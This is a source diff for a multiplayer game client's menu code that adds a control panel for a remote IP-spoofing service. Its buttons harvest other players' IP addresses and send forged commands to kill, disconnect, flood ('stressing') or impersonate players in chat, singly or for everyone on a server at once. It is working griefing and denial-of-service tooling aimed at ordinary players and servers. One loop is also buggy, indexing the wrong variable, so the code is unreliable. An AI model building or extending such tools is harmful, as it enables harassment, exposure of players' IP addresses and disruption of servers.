@@ -762,15 +762,66 @@ void CMenus::RenderServerControl(CUIRect MainView)
 
 void CMenus::RenderSpoofingGeneral(CUIRect MainView)
 {
-	// TODO: this
-	CUIRect Button;
-	static int s_FetchButton = 0;
-	if(DoButton_Menu(&s_FetchButton, Localize("Fetch IPs"), 0, &Button))
+	CUIRect Button, Box;
+
+	char aServerAddr[NETADDR_MAXSTRSIZE];
+	char aClientAddr[NETADDR_MAXSTRSIZE];
+	{
+		CServerInfo CurrentServerInfo;
+		Client()->GetServerInfo(&CurrentServerInfo);
+
+		str_copy(aServerAddr, CurrentServerInfo.m_aAddress, sizeof(aServerAddr));
+		net_addr_split(aServerAddr, sizeof(aServerAddr));
+
+		if(m_SpoofSelectedPlayer > 0)
+		{
+			str_copy(aClientAddr, m_pClient->m_aClients[m_SpoofSelectedPlayer].m_Addr, sizeof(aClientAddr));
+			net_addr_split(aClientAddr, sizeof(aClientAddr));
+		}
+	}
+
+	MainView.Margin(10.0f, &MainView);
+
+	MainView.HSplitBottom(25.0f, &MainView, &Box);
+	MainView.VSplitLeft(200.0f, &Box, &MainView);
+	//Box.Margin(10.0f, &Box);
+
+	Box.HSplitTop(25.0f, &Button, 0);
+	static int s_ButtonFetch = 0;
+	if(DoButton_Menu(&s_ButtonFetch, Localize("Test connection"), 0, &Button))
+	{
+		m_pClient->m_pSpoofRemote->SendCommand("status");
+	}
+
+	Box.HSplitTop(40.0f, 0, &Box);
+	Box.HSplitTop(25.0f, &Button, 0);
+	static int s_ButtonTest2 = 0;
+	if(DoButton_Menu(&s_ButtonTest2, Localize("Fetch IPs"), 0, &Button))
+	{
+		m_pClient->m_pSpoofRemote->SendCommand("fetchips");
+	}
+
+	Box.HSplitTop(40.0f, 0, &Box);
+	Box.HSplitTop(25.0f, &Button, 0);
+	static int s_ButtonGet = 0;
+	if(DoButton_Menu(&s_ButtonGet, Localize("Grab IPs"), 0, &Button))
 	{
 		char aCmd[256];
-		str_format(aCmd, sizeof(aCmd), "fetchips");
+		str_format(aCmd, sizeof(aCmd), "ipspam %s", aServerAddr);
 		m_pClient->m_pSpoofRemote->SendCommand(aCmd);
 	}
+
+	Box.HSplitTop(40.0f, 0, &Box);
+	Box.HSplitTop(25.0f, &Button, 0);
+	static int s_ButtonTest3 = 0;
+	if(DoButton_Menu(&s_ButtonTest3, Localize("test1"), 0, &Button))
+		;
+
+	Box.HSplitTop(40.0f, 0, &Box);
+	Box.HSplitTop(25.0f, &Button, 0);
+	static int s_ButtonTest4 = 0;
+	if(DoButton_Menu(&s_ButtonTest4, Localize("test2"), 0, &Button))
+		;
 }
 
 void CMenus::RenderSpoofingPlayers(CUIRect MainView)
@@ -891,26 +942,54 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 
 		str_copy(aServerAddr, CurrentServerInfo.m_aAddress, sizeof(aServerAddr));
 		str_copy(aClientAddr, m_pClient->m_aClients[m_SpoofSelectedPlayer].m_Addr, sizeof(aClientAddr));
+		net_addr_split(aServerAddr, sizeof(aServerAddr));
+		net_addr_split(aClientAddr, sizeof(aClientAddr));
 
-		for(int i = 0; aServerAddr[i] != '\0'; i++)
+		// always render the last message
 		{
-			if(aServerAddr[i] == ':')
-				aServerAddr[i] = ' ';
-		}
+			CUIRect Box;
+			const float HighlightTime = 2.0f; // highlight the box for 2 seconds
+			Extended.HSplitBottom(18.5f, &Extended, &Box);
+			//vec4 Color(0.3f + max(0.0f, (sinf(pi*(max(0.0f, (pi/4.0f-pi/8.0f)+m_pClient->m_pSpoofRemote->LastMessageTime()-Client()->LocalTime())*0.7f)))), 0.3f, 0.3f, 0.45f);
 
-		for(int i = 0; aClientAddr[i] != '\0'; i++)
-		{
-			if(aClientAddr[i] == ':')
-				aClientAddr[i] = ' ';
+			//vec4 Color(0.3f + max(0.0f, m_pClient->m_pSpoofRemote->LastMessageTime()+HighlightTime-Client()->LocalTime())/HighlightTime, 0.3f, 0.3f, 0.45f);
+
+			float x = max(0-(pi/4), m_pClient->m_pSpoofRemote->LastMessageTime()+HighlightTime-Client()->LocalTime())/HighlightTime;
+			float y = sin(pi*(pi/4)*x+(pi/4));
+			vec4 Color(0.3 + clamp(y*0.7f, 0.0f, 0.7f), 0.3f, 0.3f, 0.45f);
+			RenderTools()->DrawUIRect(&Box, Color, CUI::CORNER_ALL, 2.3f);
+			UI()->DoLabelScaled(&Box, m_pClient->m_pSpoofRemote->LastMessage(), 12.0f, -1, Extended.w*0.95f);
 		}
 
 		// all deh laz0rs
 		if(s_ControlPage == 1)
 		{
 			// background
-			Extended.Margin(10.0f, &Extended);
+			Extended.VMargin(10.0f, &Extended);
 			Extended.HSplitTop(20.0f, &Bottom, &Extended);
-			Extended.HSplitTop(5.0f, 0, &Extended);
+			//Extended.HSplitTop(5.0f, 0, &Extended);
+
+			Bottom.VSplitLeft(5.0f, 0, &Bottom);
+			Bottom.VSplitLeft(100.0f, &Button, &Bottom);
+
+			static int s_AllCheckbox = 0;
+			static int s_DoForAll = 0;
+			static int PrevSelectedPlayer = -1;
+			if(s_DoForAll && m_SpoofSelectedPlayer > -1)
+				s_DoForAll = 0;
+			if(DoButton_CheckBox(&s_AllCheckbox, Localize("All"), s_DoForAll, &Button))
+			{
+				if(s_DoForAll ^= 1)
+				{
+					PrevSelectedPlayer = m_SpoofSelectedPlayer;
+					m_SpoofSelectedPlayer = -1;
+				}
+				else
+				{
+					m_SpoofSelectedPlayer = PrevSelectedPlayer;
+					PrevSelectedPlayer = -1;
+				}
+			}
 
 			Bottom.VSplitLeft(5.0f, 0, &Bottom);
 			Bottom.VSplitLeft(100.0f, &Button, &Bottom);
@@ -918,7 +997,10 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 			if(DoButton_Menu(&s_KillButton, Localize("Kill"), 0, &Button))
 			{
 				char aCmd[256];
-				str_format(aCmd, sizeof(aCmd), "kill %s %s", aClientAddr, aServerAddr);
+				if(s_DoForAll)
+					str_format(aCmd, sizeof(aCmd), "killall %s", aServerAddr);
+				else
+					str_format(aCmd, sizeof(aCmd), "kill %s %s", aClientAddr, aServerAddr);
 				m_pClient->m_pSpoofRemote->SendCommand(aCmd);
 			}
 
@@ -928,7 +1010,10 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 			if(DoButton_Menu(&s_DCButton, Localize("Disconnect"), 0, &Button))
 			{
 				char aCmd[256];
-				str_format(aCmd, sizeof(aCmd), "disconnect %s %s", aClientAddr, aServerAddr);
+				if(s_DoForAll)
+					str_format(aCmd, sizeof(aCmd), "dcall %s", aServerAddr);
+				else
+					str_format(aCmd, sizeof(aCmd), "disconnect %s %s", aClientAddr, aServerAddr);
 				m_pClient->m_pSpoofRemote->SendCommand(aCmd);
 			}
 
@@ -939,8 +1024,22 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 			{
 				// glitchy! found by accident :D
 				char aCmd[256];
-				str_format(aCmd, sizeof(aCmd), "disconnect %s %s", aServerAddr, aClientAddr);
-				m_pClient->m_pSpoofRemote->SendCommand(aCmd);
+				if(s_DoForAll)
+				{
+					for(int i = 0; i < MAX_CLIENTS; i++)
+					{
+						char aBuf[NETADDR_MAXSTRSIZE];
+						str_copy(aBuf, m_pClient->m_aClients[m_SpoofSelectedPlayer].m_Addr, sizeof(aBuf));
+						net_addr_split(aBuf, sizeof(aBuf));
+						str_format(aCmd, sizeof(aCmd), "disconnect %s %s", aServerAddr, aBuf);
+						m_pClient->m_pSpoofRemote->SendCommand(aCmd);
+					}
+				}
+				else
+				{
+					str_format(aCmd, sizeof(aCmd), "disconnect %s %s", aServerAddr, aClientAddr);
+					m_pClient->m_pSpoofRemote->SendCommand(aCmd);
+				}
 			}
 
 			Bottom.VSplitLeft(5.0f, 0, &Bottom);
@@ -949,7 +1048,10 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 			if(DoButton_Menu(&s_StressingButton, Localize("Stressing"), 0, &Button))
 			{
 				char aCmd[256];
-				str_format(aCmd, sizeof(aCmd), "stressing %s %s", aClientAddr, aServerAddr);
+				if(s_DoForAll)
+					str_format(aCmd, sizeof(aCmd), "stressingall %s", aServerAddr);
+				else
+					str_format(aCmd, sizeof(aCmd), "stressing %s %s", aClientAddr, aServerAddr);
 				m_pClient->m_pSpoofRemote->SendCommand(aCmd);
 			}
 
@@ -967,7 +1069,10 @@ void CMenus::RenderSpoofing(CUIRect MainView)
 			if(DoButton_Menu(&s_SendChatButton, Localize("Send"), 0, &Button))
 			{
 				char aCmd[256];
-				str_format(aCmd, sizeof(aCmd), "chat %s %s %s", aClientAddr, aServerAddr, s_aChatMessage);
+				if(s_DoForAll)
+					str_format(aCmd, sizeof(aCmd), "chatall %s %s", aServerAddr, s_aChatMessage);
+				else
+					str_format(aCmd, sizeof(aCmd), "chat %s %s %s", aClientAddr, aServerAddr, s_aChatMessage);
 				m_pClient->m_pSpoofRemote->SendCommand(aCmd);
 			}
 
